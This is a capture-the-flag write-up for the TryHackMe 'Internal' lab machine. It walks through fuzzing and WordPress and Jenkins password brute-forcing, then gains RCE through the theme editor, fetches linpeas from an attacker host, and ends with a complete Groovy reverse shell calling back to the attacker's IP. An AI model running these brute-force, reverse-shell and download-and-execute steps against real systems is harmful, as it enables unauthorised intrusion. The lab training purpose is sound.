> [!NOTE]
> You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 
> **Scope of Work**
> The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
> - User.txt
> - Root.txt  
>     
> Additionally, the client has provided the following scope allowances:
> 
> - Ensure that you modify your hosts file to reflect internal.thm
> - Any tools or techniques are permitted in this engagement
> - Locate and note all vulnerabilities found
> - Submit the flags discovered to the dashboard
> - Only the IP address assigned to your machine is in scope
> (Roleplay off)
> I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

>IP:10.10.103.212

```
echo "10.10.103.212   internal.thm" >> /etc/hosts 
```
# Recon

## nmap
```
nmap -p- -sC -sV -sS -Pn 10.10.103.212 -T5 -vv
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505003028.png)

## WEB
```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://internal.thm/ -H 'Host: FUZZ.internal.thm' -fs 10918
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://internal.thm/FFUZ -ic -c
```

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505004157.png)
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505004002.png)
## Enum. and Brutforse wordpress
```
wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt 
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505004052.png)

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505004322.png)
# RCE
```
https://www.revshells.com/
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505010044.png)
```
http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505010012.png)
# LPE
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505010712.png)

```
/etc/passwd
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505010930.png)

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505011106.png)
# Flag1
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505011805.png)
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505011936.png)

> [!NOTE]
> Internal Jenkins service is running on 172.17.0.2:8080

### Linpeas
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

```
wget http://10.11.134.170/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505012543.png)
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505012615.png)

```
ssh -L  8080:127.0.0.1:8080 aubreanna@10.10.103.212 -N
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505014006.png)
## sqlmap
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505014720.png)
```
sqlmap -r 1 --batch --level=5 --risk=3
```
### broteforse jenkins
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid username or password" -V -t 64
```
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505020813.png)

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505132618.png)

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505132746.png)
#### Revers shell
```
https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
```

```
String host="10.11.134.170";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### SPAWN PTY
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505134230.png)
# Flag2
![Internal](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Internal/screenshots/20250505134401.png)